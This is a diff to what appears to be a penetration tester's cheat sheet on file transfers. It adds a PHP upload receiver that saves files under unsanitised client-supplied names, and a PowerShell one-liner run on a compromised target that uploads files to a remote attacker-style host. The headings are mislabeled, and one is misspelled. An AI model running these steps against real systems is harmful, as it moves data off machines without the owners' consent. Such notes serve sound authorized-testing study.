@@ -1,6 +1,6 @@
-# File Transfers
+# File Uploads
 
-## Windows
+## Windows 
 
 ### Non-interactive FTP
 
@@ -41,3 +41,23 @@ exe2hex -x file.exe -p fild.cmd
 cat file.cmd | xclip -selection clipboard
 ```
 
+# File Donwloads
+
+## Local upload PHP
+
+```
+sudo mkdir /var/www/uploads
+sudo chown www-data /var/www/uploads
+```
+In `/var/www/html/upload.php`:
+```
+<?php
+$uploaddir = '/var/www/uploads/';
+$uploadfile = $uploaddir . $_FILES['file']['name'];
+move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile);
+?>
+```
+From target:
+```
+powershell (New-Object System.Net.WebClient).UploadFile('http://ipaddress/upload.php', 'filename')
+```
